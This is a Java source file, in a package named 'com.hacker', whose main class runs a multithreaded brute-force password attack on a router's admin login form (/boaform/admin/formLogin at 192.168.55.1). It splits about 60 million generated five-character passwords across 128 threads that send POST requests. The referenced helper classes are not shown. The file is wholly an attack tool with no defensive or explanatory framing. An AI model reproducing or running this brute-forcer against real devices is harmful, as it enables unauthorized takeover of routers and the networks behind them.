package com.hacker;

import org.json.simple.JSONObject;

public class Main {
    public static void main(String[] args) {
        String url = "http://192.168.55.1/boaform/admin/formLogin";
        final int NUM_OF_THREAD = 128;
        final int NUM_OF_EACH_THREAD_REQUEST = 472392;

        try {
            EachLetterCreator elc = new EachLetterCreator();
            char[] eachLetterArr = elc.createEachLetter();

            PasswordMakser pm = new PasswordMakser();
            String[] fiveDigitArr = pm.createPasswords(eachLetterArr);

            HttpRequester httpRequester = new HttpRequester();

            int fiveDigitStartIdx = 0;
            for (int i = 0; i < NUM_OF_THREAD; i++) {
                PostThread pt = new PostThread(httpRequester, url, eachLetterArr);
                String[] fiveDigitArrForThread = new String[NUM_OF_EACH_THREAD_REQUEST];
                int startIdx = fiveDigitStartIdx;

                for (int j = startIdx; j < startIdx + NUM_OF_EACH_THREAD_REQUEST; j++) {
                    fiveDigitArrForThread[j - fiveDigitStartIdx] = fiveDigitArr[j];
                    fiveDigitStartIdx++;
                }
                pt.setFiveDigitArr(fiveDigitArrForThread);
                pt.start();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
